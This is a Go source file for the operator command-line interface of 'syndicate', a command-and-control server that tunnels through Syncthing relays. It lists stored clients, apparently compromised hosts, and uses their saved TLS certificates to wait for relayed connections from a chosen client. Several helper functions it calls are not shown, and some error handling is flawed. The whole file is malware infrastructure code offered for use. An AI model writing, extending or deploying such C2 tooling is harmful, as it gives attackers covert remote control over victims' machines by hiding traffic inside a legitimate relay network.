package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"errors"
	"fmt"
	"os"

	"gitlab.torproject.org/acheong08/syndicate/lib"

	"github.com/leaanthony/clir"
)

func main() {
	// clientIndex is always +1 of the actual index as 0 means broadcast
	var clientIndex int
	var countryCode string = "UK"
	cli := clir.NewCli("syndicate", "A C2 server over syncthing", "v0.0.1")
	listCmd := cli.NewSubCommand("list", "List all clients")
	listCmd.Action(func() error {
		clientList := getClientList()
		for i, client := range clientList {
			fmt.Printf("%d: %s\n", i+1, client.String())
		}
		return nil
	})

	listenCmd := cli.NewSubCommand("listen", "Start broadcasting with a specific device ID and wait for relay connections")
	listenCmd.IntFlag("client", "The client index to interact with", &clientIndex)
	listenCmd.StringFlag("country", "The country code of the relay to pick", &countryCode)
	listenCmd.Action(func() error {
		clientList := getClientList()
		// TODO: Support broadcast to all clients
		if clientIndex == 0 || clientIndex > len(clientList) {
			fmt.Println("Invalid client index. Clients:")
			for i, client := range clientList {
				fmt.Printf("%d: %s\n", i+1, client.String())
			}
			return errors.New("invalid arguments")
		}

		client := clientList[clientIndex-1]
		// Find optimal relay
		relayAddress, err := findOptimalRelay(countryCode)
		if err != nil {
			panic(err)
		}
		cert, err := tls.X509KeyPair(client.ServerCert[0], client.ServerCert[1])
		if err != nil {
			panic(err)
		}
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		// Start broadcasting
		if err := startBroadcast(ctx, cert, relayAddress); err != nil {
			panic(err)
		}
		clientCert, err := x509.ParseCertificate(client.ClientCert)
		// Wait for a connection through the relay
		_, err = listenRelay(cert, relayAddress, client.ClientID, clientCert)
		if err != nil {
			panic(err)
		}
		return nil
	})

	cli.Run()
}

func getClientList() lib.ClientList {
	var clientList lib.ClientList
	configDir, err := os.UserConfigDir()
	if err != nil {
		panic(err)
	}
	configDir += "/syndicate"
	file, err := os.Open(configDir + "/clients.bin")
	defer file.Close()
	if err != nil {
		return clientList
	}
	decoder := gob.NewDecoder(file)
	decoder.Decode(&clientList)
	return clientList
}
